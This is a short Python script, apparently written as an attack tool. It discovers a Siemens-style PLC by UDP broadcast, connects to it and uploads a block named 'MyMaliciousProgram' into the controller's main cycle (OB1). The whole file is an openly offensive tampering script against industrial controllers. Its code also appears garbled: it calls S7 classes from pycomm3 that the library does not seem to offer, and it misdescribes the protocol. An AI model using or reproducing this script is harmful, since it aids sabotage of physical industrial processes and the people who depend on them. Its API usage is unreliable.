import socket
import pycomm3
from pycomm3 import LogixDriver, S7Client

# Function to discover the IP address of the PLC
def discover_plc_ip():
    # Define the broadcast address and port
    broadcast_address = '255.255.255.255'
    port = 102

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5)

    # Send a broadcast message to discover the PLC
    sock.sendto(b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', (broadcast_address, port))

    # Receive the response
    try:
        data, addr = sock.recvfrom(1024)
        return addr[0]
    except socket.timeout:
        print("No PLC found on the network.")
        return None

# Function to connect to the PLC and modify the tasking
def modify_controller_tasking(plc_ip):
    # Create a connection to the PLC
    plc = S7Client()
    plc.connect(plc_ip, 0, 1)

    if not plc.is_connected():
        print(f"Failed to connect to PLC at {plc_ip}")
        return

    print(f"Connected to PLC at {plc_ip}")

    # Define the new program to be added to OB1
    new_program = """
    PROGRAM MyMaliciousProgram
    VAR
        counter : INT := 0;
    END_VAR

    counter := counter + 1;
    IF counter > 1000 THEN
        counter := 0;
    END_IF
    END_PROGRAM
    """

    # Upload the new program to the PLC
    try:
        plc.upload_block(new_program, 'MyMaliciousProgram')
        print("Program uploaded successfully.")
    except Exception as e:
        print(f"Failed to upload program: {e}")
        return

    # Add the new program to OB1
    try:
        plc.write_area(pycomm3.s7.S7AreaDB, 1, 0, [pycomm3.s7.S7DataItem(pycomm3.s7.S7WLByte, 0, b'\x01')])
        print("Program added to OB1 successfully.")
    except Exception as e:
        print(f"Failed to add program to OB1: {e}")

    # Disconnect from the PLC
    plc.disconnect()
    print("Disconnected from PLC.")

# Main function
def main():
    plc_ip = discover_plc_ip()
    if plc_ip:
        modify_controller_tasking(plc_ip)

if __name__ == "__main__":
    main()